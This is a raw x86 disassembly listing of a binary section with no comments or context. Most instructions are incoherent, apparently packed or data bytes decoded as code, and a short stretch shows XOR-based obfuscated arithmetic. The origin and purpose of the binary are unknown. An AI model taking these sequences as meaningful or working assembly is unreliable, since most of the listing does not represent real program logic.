  409d64:	mov    dh,0xdf
  409d66:	mov    al,ds:0x5b1dbbd9
  409d6b:	pop    ss
  409d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d6d:	lods   eax,DWORD PTR ds:[esi]
  409d6e:	stc    
  409d6f:	jp     0x409d95
  409d71:	cmp    DWORD PTR [esi-0x53],edi
  409d74:	retf   0x41f6
  409d77:	jbe    0x409d3d
  409d79:	scas   eax,DWORD PTR es:[edi]
  409d7a:	inc    ecx
  409d7b:	std    
  409d7c:	fwait
  409d7d:	cmc    
  409d7e:	retf   0xc9f8
  409d81:	xchg   ebx,eax
  409d82:	pop    edx
  409d83:	out    0xe8,eax
  409d85:	test   DWORD PTR [ecx],esp
  409d87:	gs pop ecx
  409d89:	pop    ecx
  409d8a:	mov    ebx,?
  409d8c:	and    DWORD PTR [ebx-0x4ef86644],edi
  409d92:	cmp    al,BYTE PTR [esi]
  409d94:	repz dec ebp
  409d96:	jg     0x409db6
  409d98:	call   FWORD PTR [ecx-0x6bab5b87]
  409d9e:	imul   edx,DWORD PTR ds:0x929195b7,0x7ffa0890
  409da8:	push   cs
  409da9:	adc    al,0x32
  409dab:	pop    ebp
  409dac:	adc    esi,0xfffffff1
  409daf:	adc    al,0xb4
  409db1:	repz sub ch,bh
  409db4:	das    
  409db5:	iret   
  409db6:	addr16 jb 0x409d84
  409db9:	test   BYTE PTR [ebp+0x29],bl
  409dbc:	daa    
  409dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbe:	sub    eax,0x6ce02df8
  409dc3:	mov    ch,0xb0
  409dc5:	cmp    bl,cl
  409dc7:	jmp    0x409e45
  409dc9:	ins    BYTE PTR es:[edi],dx
  409dca:	mov    ah,BYTE PTR [ebx+0x1f0af995]
  409dd0:	cld    
  409dd1:	xchg   edi,eax
  409dd2:	out    dx,eax
  409dd3:	nop
  409dd4:	cmp    al,ah
  409dd6:	push   cs
  409dd7:	sub    DWORD PTR [esi+eiz*1],ebx
  409dda:	mov    bh,ah
  409ddc:	sub    BYTE PTR gs:[eax],dh
  409ddf:	push   0x69
  409de1:	iret   
  409de2:	xor    BYTE PTR [edi],cl
  409de4:	(bad)  
  409de5:	lea    esp,[ebp+0x42800320]
  409deb:	in     al,0xbb
  409ded:	lahf   
  409dee:	inc    edx
  409def:	and    cl,dl
  409df1:	sub    dl,dl
  409df3:	adc    al,0x8c
  409df5:	push   esi
  409df6:	ja     0x409e6c
  409df8:	lock adc al,0x65
  409dfb:	stc    
  409dfc:	sar    BYTE PTR [esi-0x53],1
  409dff:	jbe    0x409e10
  409e01:	xchg   ebp,eax
  409e02:	ror    DWORD PTR [edi],1
  409e04:	sar    ebx,0xdf
  409e07:	sbb    cl,BYTE PTR ds:0x2e890bcd
  409e0d:	gs clc 
  409e0f:	es cmp eax,0xc2d7fd35
  409e15:	xor    eax,0x7bb32b80
  409e1a:	mov    ah,0xee
  409e1c:	shl    DWORD PTR ds:0xef03477f,cl
  409e22:	mov    cl,0x56
  409e24:	(bad)  
  409e25:	fwait
  409e26:	mov    ebx,0xd80337ed
  409e2b:	cmp    bh,ch
  409e2d:	lods   eax,DWORD PTR ds:[esi]
  409e2e:	mov    esi,0xabea9e83
  409e33:	pop    ebp
  409e34:	cmp    BYTE PTR [edi],bl
  409e36:	test   DWORD PTR [edx-0x49ea0503],0xba1e46dc
  409e40:	pop    es
  409e41:	add    bh,BYTE PTR [edx]
  409e43:	mov    eax,0x1c4f4f06
  409e48:	dec    eax
  409e49:	out    dx,al
  409e4a:	jae    0x409e24
  409e4c:	fnsave [edx-0x115a80af]
  409e52:	stos   BYTE PTR es:[edi],al
  409e53:	xlat   BYTE PTR ds:[ebx]
  409e54:	in     eax,dx
  409e55:	mov    gs,WORD PTR ds:[ebx-0x56]
  409e59:	push   DWORD PTR [ebp+0x20]
  409e5c:	push   ss
  409e5d:	mov    esp,0xd6726924
  409e62:	cs in  eax,0xe5
  409e65:	jmp    0x409ee2
  409e67:	loopne 0x409e0c
  409e69:	mov    edx,ecx
  409e6b:	pop    edx
  409e6c:	mov    bh,0xac
  409e6e:	mov    eax,ds:0xc3e84ab1
  409e73:	cmp    al,al
  409e75:	jbe    0x409e0d
  409e77:	dec    esp
  409e78:	aad    0x36
  409e7a:	daa    
  409e7b:	lahf   
  409e7c:	imul   ecx,DWORD PTR [ebp+0x25297835],0x20
  409e83:	test   BYTE PTR [esi+0x4b],0x92
  409e87:	and    BYTE PTR gs:[ebp-0x56abcd32],ah
  409e8e:	adc    eax,0x2e9b8661
  409e93:	or     eax,0x3d3bc68
  409e98:	scas   eax,DWORD PTR es:[edi]
  409e99:	ins    BYTE PTR es:[edi],dx
  409e9a:	dec    esi
  409e9b:	xchg   BYTE PTR [ebx+0x2d],cl
  409e9e:	sub    dh,BYTE PTR [ecx+0xff2c38c]
  409ea4:	inc    edx
  409ea5:	(bad)  
  409ea7:	(bad)  
  409ea8:	ja     0x409e44
  409eaa:	ins    DWORD PTR es:[edi],dx
  409eab:	ret    
  409eac:	inc    esp
  409ead:	dec    ecx
  409eae:	xlat   BYTE PTR ds:[ebx]
  409eaf:	ret    
  409eb0:	rcr    BYTE PTR [esp+esi*8],0xb4
  409eb4:	mov    esp,0x37fd3dd6
  409eb9:	xchg   ebx,eax
  409eba:	in     al,dx
  409ebb:	mov    DWORD PTR [edi+0x2f],edx
  409ebe:	dec    di
  409ec0:	dec    esp
  409ec1:	pop    ss
  409ec2:	dec    esi
  409ec3:	xor    esi,DWORD PTR [edx-0x2022ecfd]
  409ec9:	jge    0x409f40
  409ecb:	scas   eax,DWORD PTR es:[edi]
  409ecc:	fild   WORD PTR [ecx]
  409ece:	cs mov ecx,0x5cde8306
  409ed4:	add    ah,BYTE PTR [esi-0x40]
  409ed7:	repnz cmp eax,0xbb20f757
  409edd:	out    0x1a,al
  409edf:	(bad)  
  409ee0:	mov    eax,0x3c1e209a
  409ee5:	mov    ebp,0x14e38919
  409eea:	sub    DWORD PTR [ebx+edx*2+0x37],ebx
  409eee:	imul   edi,DWORD PTR [edx+0x8],0x584223a3
  409ef5:	jle    0x409f20
  409ef7:	shl    esp,cl
  409ef9:	ja     0x409e90
  409efb:	mov    ds:0xd5d3e5ea,eax
  409f00:	test   al,0xbe
  409f02:	dec    ebx
  409f03:	xlat   BYTE PTR ds:[ebx]
  409f04:	and    al,0x53
  409f06:	xchg   BYTE PTR [esi+0x3],dh
  409f09:	out    dx,al
  409f0a:	in     al,0xd8
  409f0c:	sbb    DWORD PTR [eax-0x73b2f5af],esi
  409f12:	add    ecx,edi
  409f14:	sar    DWORD PTR [ecx],0x40
  409f17:	arpl   WORD PTR [eax-0x3d],ax
  409f1a:	xchg   DWORD PTR [edi+0x54],ebp
  409f1d:	adc    eax,0xe17000c2
  409f22:	or     ah,BYTE PTR [ebx-0x1d]
  409f25:	mov    dl,0x57
  409f27:	stc    
  409f28:	pop    edi
  409f29:	shl    BYTE PTR [edi-0x6],0xa7
  409f2d:	ret    
  409f2e:	mov    esi,0x19597139
  409f33:	pop    ss
  409f34:	jg     0x409f83
  409f36:	xor    ah,al
  409f38:	mov    ebp,0xa32ede8b
  409f3d:	cmp    al,0xc7
  409f3f:	add    al,0x63
  409f42:	inc    ebp
  409f43:	or     bh,al
  409f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f46:	adc    ebx,ecx
  409f48:	test   eax,0x73e4a822
  409f4d:	aad    0x26
  409f4f:	mov    al,0xf3
  409f51:	adc    cl,BYTE PTR [edx]
  409f53:	lahf   
  409f54:	push   ebp
  409f55:	inc    eax
  409f56:	bound  edx,QWORD PTR [esi-0x55bd9beb]
  409f5c:	mov    ch,0x94
  409f5e:	push   0xe0001dd9
  409f63:	cmp    al,0x0
  409f65:	fld    QWORD PTR [ebp-0x568497fb]
  409f6b:	icebp  
  409f6c:	jns    0x409f7e
  409f6e:	fnop   
  409f70:	ds daa 
  409f72:	pop    ebp
  409f73:	sbb    al,0xfc
  409f75:	cwde   
  409f76:	imul   ebp,ecx,0xb9481bd6
  409f7c:	inc    ecx
  409f7d:	cmc    
  409f7e:	or     DWORD PTR [ebx+ebp*8],ecx
  409f81:	adc    DWORD PTR [ebx+ecx*1+0x1c],esi
  409f85:	adc    DWORD PTR [esi-0x7d],esi
  409f88:	mov    ebp,0xbafb957
  409f8d:	stc    
  409f8e:	and    ecx,DWORD PTR [ebp+esi*8+0x75]
  409f92:	inc    esp
  409f93:	jno    0x409fff
  409f95:	loopne 0x409f8f
  409f97:	sbb    DWORD PTR [esi+ebp*8-0x633c9123],ebx
  409f9e:	call   0xeee0:0xd50ee5ee
  409fa5:	shr    BYTE PTR [edx+edi*1-0x52],cl
  409fa9:	popa   
  409faa:	jmp    0x1465dd41
  409faf:	fstp   TBYTE PTR [edx]
  409fb1:	dec    ecx
  409fb2:	mov    ch,0x97
  409fb4:	lahf   
  409fb5:	in     al,dx
  409fb6:	addr16 fs jne 0x409f5b
  409fba:	inc    edi
  409fbb:	push   es
  409fbc:	out    dx,eax
  409fbd:	(bad)
  409fc0:	adc    eax,0x56e6085a
  409fc5:	ds int 0xa
  409fc8:	cdq    
  409fc9:	call   0xaa1558c2
  409fce:	pop    es
  409fcf:	and    DWORD PTR [ebx],esp
  409fd1:	cmp    DWORD PTR [ecx],edx
  409fd3:	mov    dl,0x25
  409fd5:	icebp  
  409fd6:	cmp    DWORD PTR [ecx+ebp*1],edi
  409fd9:	or     al,0x4f
  409fdb:	jle    0x409fc7
  409fdd:	pop    eax
  409fde:	sbb    edi,0xffffffda
  409fe1:	push   cs
  409fe2:	adc    DWORD PTR [esi-0x7959622c],edx
  409fe8:	(bad)  
  409fe9:	mov    esp,0x6c2b3b08
  409fee:	jmp    0x40a063
  409ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff1:	sub    ebp,DWORD PTR [eax+0x18b9d0d4]
  409ff7:	enter  0xe7d8,0x7d
  409ffb:	cmc    
  409ffc:	pop    ds
  409ffd:	add    BYTE PTR [ebx-0xd],bl
  40a000:	push   ss
  40a001:	ins    BYTE PTR es:[edi],dx
  40a002:	icebp  
  40a003:	aad    0x6e
  40a005:	int    0x62
  40a007:	ds out 0x8b,eax
  40a00a:	dec    ebp
  40a00b:	lock xor eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x36]
  40a02a:	shl    esi,1
  40a02c:	test   DWORD PTR [eax-0x12],esi
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	scas   al,BYTE PTR es:[edi]
  40a036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a037:	data16 and BYTE PTR [ebx],bh
  40a03a:	mov    DWORD PTR [esi+0x3],edi
  40a03d:	fisttp DWORD PTR [esi]
  40a03f:	cmp    eax,0xc32db780
  40a044:	jne    0x40a08f
  40a046:	(bad)  
  40a048:	or     DWORD PTR [ebx+0x1a78098c],ebx
  40a04e:	mov    ecx,0x13a80400
  40a053:	imul   ebx,DWORD PTR [esi],0x90328d12
  40a059:	xor    bh,BYTE PTR [eax-0x21]
  40a05c:	mov    ds:0x584b0daf,eax
  40a061:	pop    ds
  40a062:	sub    ch,BYTE PTR [edi+edi*1-0x4de6626c]
  40a069:	xchg   esi,eax
  40a06a:	out    dx,al
  40a06b:	outs   dx,DWORD PTR ds:[esi]
  40a06c:	pop    es
  40a06d:	dec    esi
  40a06e:	sti    
  40a06f:	test   al,0x8f
  40a071:	test   BYTE PTR [edx+ecx*8+0x46c3bb2e],dl
  40a078:	adc    esp,DWORD PTR [edx]
  40a07a:	mov    ds:0x62cb4e7c,al
  40a07f:	push   eax
  40a080:	push   esi
  40a081:	ins    DWORD PTR es:[edi],dx
  40a082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a083:	ja     0x40a03a
  40a085:	test   al,0xc3
  40a087:	jmp    0x40a04f
  40a089:	jp     0x40a01b
  40a08b:	mov    ah,dh
  40a08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a08e:	ins    BYTE PTR es:[edi],dx
  40a08f:	stos   DWORD PTR es:[edi],eax
  40a090:	aad    0xff
  40a092:	retf   0x5d7e
  40a095:	jbe    0x40a099
  40a097:	adc    edi,DWORD PTR [eax+0xd5486e1]
  40a09d:	adc    eax,0x33146f7
  40a0a2:	jo     0x40a099
  40a0a4:	xchg   edi,eax
  40a0a5:	(bad)  
  40a0a7:	mov    BYTE PTR [edi-0xfb32226],ah
  40a0ad:	jmp    0x5bb98792
  40a0b2:	arpl   WORD PTR [edx],cx
  40a0b4:	add    eax,0xa300e7d9
  40a0b9:	or     ch,BYTE PTR [edi+0x4e]
  40a0bc:	xchg   esi,eax
  40a0bd:	add    ebx,DWORD PTR [ecx+0x6d2d55b4]
  40a0c3:	std    
  40a0c4:	dec    DWORD PTR [esi-0x71]
  40a0c7:	retf   0x471e
  40a0ca:	mov    eax,0xc1172635
  40a0cf:	sbb    al,0x6f
  40a0d1:	cli    
  40a0d2:	mov    edi,0x576f22f9
  40a0d7:	mov    ecx,edx
  40a0d9:	fwait
  40a0da:	in     eax,0xa2
  40a0dc:	pop    ecx
  40a0dd:	stos   BYTE PTR es:[edi],al
  40a0de:	bound  esi,QWORD PTR [ecx+0x25]
  40a0e1:	arpl   WORD PTR [edi+edx*1],dx
  40a0e4:	arpl   WORD PTR [ecx],dx
  40a0e6:	push   esi
  40a0e7:	sub    al,0xaa
  40a0e9:	sub    edx,edi
  40a0eb:	addr16 inc eax
  40a0ed:	dec    ebx
  40a0ee:	dec    edi
  40a0ef:	es iret 
  40a0f1:	sub    dl,BYTE PTR [edx+0x37c4f7e8]
  40a0f7:	adc    al,0xf3
  40a0f9:	xor    al,0xce
  40a0fb:	cdq    
  40a0fc:	std    
  40a0fd:	or     al,0xba
  40a0ff:	pop    es
  40a100:	inc    edi
  40a101:	(bad)  
  40a102:	and    DWORD PTR [eax+ebp*8-0x7216aa62],esi
  40a109:	dec    ecx
  40a10a:	gs jbe 0x40a098
  40a10d:	test   DWORD PTR [esi+eax*2+0x6e3fc127],0x3f6131ca
  40a118:	fs push ecx
  40a11a:	rol    eax,cl
  40a11c:	and    al,0x21
  40a11e:	(bad)  
  40a11f:	fst    DWORD PTR [esi]
  40a121:	outs   dx,BYTE PTR ds:[esi]
  40a122:	popf   
  40a123:	push   ebp
  40a124:	add    esi,ecx
  40a126:	or     edi,DWORD PTR [edi-0x3a]
  40a129:	lods   eax,DWORD PTR ds:[esi]
  40a12a:	add    al,0xe4
  40a12c:	sub    al,0x48
  40a12e:	jb     0x40a108
  40a130:	adc    ecx,edi
  40a132:	enter  0xeaf5,0x7a
  40a136:	call   0xf5e5:0xe097acdb
  40a13d:	mov    cl,0x1e
  40a13f:	mov    ds:0xa0fa7997,al
  40a144:	idiv   ah
  40a146:	add    al,0x2f
  40a148:	pop    ebp
  40a149:	xlat   BYTE PTR ds:[ebx]
  40a14a:	aas    
  40a14b:	inc    edx
  40a14c:	scas   al,BYTE PTR es:[edi]
  40a14d:	fisttp WORD PTR [ecx-0x3b70a143]
  40a153:	mov    ebp,0xf95dddeb
  40a158:	mov    esp,0xb0da0b6b
  40a15d:	xlat   BYTE PTR ds:[ebx]
  40a15e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40a160:	add    esp,ebx
  40a162:	fcmovu st,st(5)
  40a164:	stc    
  40a165:	sahf   
  40a166:	call   0xe245:0x95dfe6ec
  40a16d:	sub    al,0x93
  40a16f:	xchg   ebp,eax
  40a170:	mov    eax,0x963e0c10
  40a175:	adc    esp,DWORD PTR [ecx-0x8]
  40a178:	std    
  40a179:	sti    
  40a17a:	in     eax,dx
  40a17b:	ret    
  40a17c:	stos   DWORD PTR es:[edi],eax
  40a17d:	clc    
  40a17e:	jmp    0x1006:0xc779c516
  40a185:	mov    DWORD PTR [edi+edi*4],0x35f1e6e8
  40a18c:	mov    dh,BYTE PTR [ebx-0x7e]
  40a18f:	out    0x73,eax
  40a191:	jnp    0x40a15c
  40a193:	mov    eax,es
  40a195:	enter  0xc1a0,0x1b
  40a199:	fsubr  QWORD PTR [ebx]
  40a19b:	add    al,0x49
  40a19d:	std    
  40a19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a19f:	inc    eax
  40a1a0:	(bad)  
  40a1a1:	jmp    0x40a16e
  40a1a3:	nop
  40a1a4:	or     DWORD PTR [ecx-0x58ccb4be],edi
  40a1aa:	icebp  
  40a1ab:	ins    DWORD PTR es:[edi],dx
  40a1ac:	popa   
  40a1ad:	inc    ebp
  40a1ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1af:	push   esp
  40a1b0:	scas   eax,DWORD PTR es:[edi]
  40a1b1:	popf   
  40a1b2:	push   eax
  40a1b3:	and    ebx,ebp
  40a1b5:	pop    eax
  40a1b6:	(bad)  
  40a1b7:	repnz dec esp
  40a1b9:	ror    dh,0xe1
  40a1bc:	outs   dx,DWORD PTR ds:[esi]
  40a1bd:	fsubr  QWORD PTR [eax]
  40a1bf:	adc    bh,BYTE PTR [ebx-0x6c66e199]
  40a1c5:	add    eax,0xde36ae73
  40a1ca:	jo     0x40a168
  40a1cc:	call   0xf5107ddd
  40a1d1:	jl     0x40a168
  40a1d3:	pop    es
  40a1d4:	push   0xffffffda
  40a1d6:	pop    edx
  40a1d7:	stos   DWORD PTR es:[edi],eax
  40a1d8:	xor    al,0xdd
  40a1da:	jp     0x40a256
  40a1dc:	fstp   TBYTE PTR [esi+0x6]
  40a1df:	jno    0x40a1a2
  40a1e1:	cmc    
  40a1e2:	pop    eax
  40a1e3:	and    BYTE PTR [esi+ecx*4],0xa
  40a1e7:	xor    dl,ch
  40a1e9:	call   0x158b:0xb3a8dddf
  40a1f0:	cwde   
  40a1f1:	out    dx,al
  40a1f2:	in     eax,0x69
  40a1f4:	jne    0x40a194
  40a1f6:	(bad)  
  40a1f7:	inc    BYTE PTR [edi-0x1dbbb38c]
  40a1fd:	shr    edx,cl
  40a1ff:	bound  eax,QWORD PTR [edx-0x3c]
  40a202:	push   ds
  40a203:	pop    ds
  40a204:	out    dx,al
  40a205:	jl     0x40a19b
  40a207:	sub    cl,BYTE PTR [ebp-0x6954129]
  40a20d:	and    eax,0x1a144ace
  40a212:	or     ch,BYTE PTR [esi]
  40a214:	cmc    
  40a215:	das    
  40a216:	cdq    
  40a217:	leave  
  40a218:	popf   
  40a219:	mov    WORD PTR [edi-0x67],fs
  40a21c:	add    BYTE PTR [edx+0x1d],cl
  40a21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a220:	sbb    al,0xe7
  40a222:	retf   0x27c2
  40a225:	add    ecx,esp
  40a227:	push   esi
  40a228:	xor    eax,0x26b946bb
  40a22d:	mov    DWORD PTR [edi-0x2f],ebx
  40a230:	sbb    ecx,DWORD PTR [edx-0x45]
  40a233:	cs mov ebx,esp
  40a236:	je     0x40a20c
  40a238:	hlt    
  40a239:	sahf   
  40a23a:	aaa    
  40a23b:	dec    esp
  40a23c:	dec    esp
  40a23d:	cmp    BYTE PTR [eax+0x2d],ah
  40a240:	push   ebp
  40a241:	das    
  40a242:	xchg   ebp,eax
  40a243:	add    BYTE PTR [ecx+0x19],ch
  40a246:	stc    
  40a247:	or     eax,0x63fe3b42
  40a24c:	push   edx
  40a24d:	ret    
  40a24e:	mov    eax,ds:0x2d095d3c
  40a253:	push   eax
  40a254:	mov    edi,0xb6f4c1f8
  40a259:	call   0x369b3a7f
  40a25e:	stos   BYTE PTR es:[edi],al
  40a25f:	adc    ecx,DWORD PTR [edi+0x1a81ea21]
  40a265:	in     eax,dx
  40a266:	(bad)  
  40a267:	es scas al,BYTE PTR es:[edi]
  40a269:	sub    eax,0xe7a80642
  40a26e:	mov    al,0xac
  40a270:	(bad)  
  40a271:	je     0x40a22e
  40a273:	push   edi
  40a274:	(bad)  
  40a275:	adc    eax,0xbb84c405
  40a27a:	fbstp  TBYTE PTR [edi]
  40a27c:	rol    ah,0x2a
  40a27f:	ret    
  40a280:	xor    al,0x23
  40a282:	les    eax,FWORD PTR ds:0xa86aedea
  40a288:	es jp  0x40a29e
  40a28b:	add    bl,BYTE PTR [ebx]
  40a28d:	or     ebx,DWORD PTR [esi+0x3db0ea5e]
  40a293:	clc    
  40a294:	sti    
  40a295:	or     eax,0x290e8658
  40a29a:	jbe    0x40a279
  40a29c:	into   
  40a29d:	dec    edx
  40a29e:	push   ds
  40a29f:	cmc    
  40a2a0:	cld    
  40a2a1:	sub    ecx,DWORD PTR es:[esp+eax*2]
  40a2a5:	inc    esp
  40a2a6:	in     eax,dx
  40a2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2a8:	sub    eax,0x26b93b6d
  40a2ad:	stc    
  40a2ae:	fwait
  40a2af:	xor    dh,dl
  40a2b1:	cmp    ebx,edi
  40a2b3:	sub    ch,cl
  40a2b5:	jns    0x40a256
  40a2b7:	sub    DWORD PTR [ecx],edx
  40a2b9:	fcom   QWORD PTR [esi-0x67]
  40a2bc:	cmp    BYTE PTR [edi],al
  40a2be:	jge    0x40a31c
  40a2c0:	call   0xf83451fb
  40a2c5:	adc    al,0xbd
  40a2c7:	and    dl,BYTE PTR ds:0x5315a144
  40a2cd:	iret   
  40a2ce:	(bad)  
  40a2cf:	pop    ds
  40a2d0:	arpl   dx,bp
  40a2d2:	ror    DWORD PTR [ecx],0x95
  40a2d5:	loope  0x40a2d1
  40a2d7:	in     eax,dx
  40a2d8:	repz pop ebx
  40a2da:	lds    edx,FWORD PTR [ecx]
  40a2dc:	shl    DWORD PTR fs:[eax+0x10bf4d24],cl
  40a2e3:	mov    ds:0x884089e8,eax
  40a2e8:	inc    ecx
  40a2e9:	in     eax,0xa8
  40a2eb:	mov    ch,0xe4
  40a2ed:	cmp    edi,DWORD PTR [ecx]
  40a2ef:	mov    al,0xf6
  40a2f1:	dec    eax
  40a2f2:	cmc    
  40a2f3:	xchg   BYTE PTR [edi],dh
  40a2f5:	jne    0x40a29c
  40a2f7:	mov    al,0x92
  40a2f9:	push   ebp
  40a2fa:	jmp    0x77b4:0xdf2f4f86
  40a301:	stos   DWORD PTR es:[edi],eax
  40a302:	lods   eax,DWORD PTR ds:[esi]
  40a303:	jle    0x40a2b2
  40a305:	and    eax,0xadddd213
  40a30a:	js     0x40a2dd
  40a30c:	and    DWORD PTR [esi+0x15],esi
  40a30f:	jmp    0x31c1:0x835d5259
  40a316:	test   BYTE PTR [ebx+edx*2],0x9e
  40a31a:	and    bl,BYTE PTR [eax-0x79]
  40a31d:	pop    esp
  40a31e:	or     BYTE PTR [ecx-0x4],0xf0
  40a322:	xchg   DWORD PTR [edi+0x27],ecx
  40a325:	or     al,0x67
  40a327:	mov    dl,0x90
  40a329:	pop    edi
  40a32a:	in     al,0x61
  40a32c:	xor    ch,BYTE PTR [edi]
  40a32e:	adc    al,0x78
  40a330:	ins    DWORD PTR es:[edi],dx
  40a331:	add    ch,BYTE PTR [ebx]
  40a333:	mov    DWORD PTR [edi],esp
  40a335:	fiadd  DWORD PTR [eax]
  40a337:	int    0x3a
  40a339:	xor    ecx,esi
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	xor    esp,DWORD PTR [edi+0x74]
  40a3ce:	(bad)  
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	test   al,0xbe
  40a3d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3da:	ins    BYTE PTR es:[edi],dx
  40a3db:	cmp    DWORD PTR [esi-0x66],esi
  40a3de:	mov    ah,0x33
  40a3e0:	int3   
  40a3e1:	cdq    
  40a3e2:	aam    0xde
  40a3e4:	sub    al,0x5b
  40a3e6:	daa    
  40a3e7:	inc    esp
  40a3e8:	test   ebp,eax
  40a3ea:	lea    edi,ds:0x20b17b5a
  40a3f0:	mov    cl,0x59
  40a3f2:	xchg   ecx,eax
  40a3f3:	xchg   esi,eax
  40a3f4:	xor    eax,0xe74b170a
  40a3f9:	sar    BYTE PTR [edi],1
  40a3fb:	pusha  
  40a3fc:	fmul   st(6),st
  40a3fe:	xchg   BYTE PTR [ebx-0x3793ca84],cl
  40a404:	test   eax,0xebf6b039
  40a409:	push   edx
  40a40a:	jno    0x40a475
  40a40c:	(bad)  
  40a40d:	fsubr  DWORD PTR [ebp-0x1a]
  40a410:	push   0x5a
  40a412:	push   eax
  40a413:	je     0x40a412
  40a415:	arpl   WORD PTR [esi],bx
  40a417:	sbb    eax,DWORD PTR [ecx]
  40a419:	sub    al,0x87
  40a41b:	push   ds
  40a41c:	dec    edx
  40a41d:	mov    ah,0xf2
  40a41f:	mov    bh,0x47
  40a421:	mov    ebp,0x593fdf34
  40a426:	scas   al,BYTE PTR es:[edi]
  40a427:	add    eax,0x881d34f3
  40a42c:	jb     0x40a3bd
  40a42e:	data16 (bad) 
  40a430:	mov    ebx,edi
  40a432:	std    
  40a433:	hlt    
  40a434:	or     BYTE PTR [esi-0x4f],al
  40a437:	cdq    
  40a438:	add    al,0xcb
  40a43a:	mov    ebx,0xe76dcca9
  40a43f:	popf   
  40a440:	and    BYTE PTR [ecx+0xe],bh
  40a443:	push   0xffffff83
  40a445:	inc    ebx
  40a446:	fcom   DWORD PTR ds:0x81df2ce0
  40a44c:	test   eax,0x6aaaf335
  40a451:	in     al,dx
  40a452:	push   esp
  40a453:	inc    esi
  40a454:	out    0x6f,eax
  40a456:	pop    ss
  40a457:	sbb    DWORD PTR [eax],ecx
  40a459:	outs   dx,DWORD PTR ds:[esi]
  40a45a:	xor    eax,0x1adceb8e
  40a45f:	xchg   ebx,eax
  40a460:	jle    0x40a485
  40a462:	popf   
  40a463:	(bad)  
  40a464:	(bad)  
  40a465:	mov    al,ds:0xf1b3974c
  40a46a:	xchg   ebp,eax
  40a46b:	popf   
  40a46c:	pop    esi
  40a46d:	sti    
  40a46e:	cmp    eax,0x50050a2a
  40a473:	jbe    0x40a484
  40a475:	mov    BYTE PTR [ecx-0x2f84701e],bh
  40a47b:	addr16 push ecx
  40a47d:	jecxz  0x40a43e
  40a47f:	ds out 0x95,al
  40a482:	aas    
  40a483:	xchg   ch,bh
  40a485:	sub    al,BYTE PTR [ecx]
  40a487:	dec    edi
  40a488:	imul   esp,DWORD PTR [eax+0x3b7ff8e2],0x43
  40a48f:	out    0x63,eax
  40a491:	pop    esi
  40a492:	stos   DWORD PTR es:[edi],eax
  40a493:	add    BYTE PTR [esp+eax*8-0x6dcfbbb0],cl
  40a49a:	je     0x40a439
  40a49c:	xor    ch,BYTE PTR [edx+0x2c]
  40a49f:	aam    0xf9
  40a4a1:	add    al,0x52
  40a4a3:	ds xchg edx,eax
  40a4a5:	test   al,0x2f
  40a4a7:	popa   
  40a4a8:	cli    
  40a4a9:	pusha  
  40a4aa:	adc    ah,BYTE PTR [esi+0x7d5185f5]
  40a4b0:	sti    
  40a4b1:	dec    esi
  40a4b2:	adc    al,0xcb
  40a4b4:	inc    edi
  40a4b5:	popf   
  40a4b6:	sub    esi,DWORD PTR [esp+ebp*4]
  40a4b9:	add    DWORD PTR [edi+0x4eb7037b],edx
  40a4bf:	cmp    al,0x42
  40a4c1:	or     DWORD PTR [esi+0x425640de],ebp
  40a4c7:	inc    esp
  40a4c8:	sub    eax,0x3fa2b05b
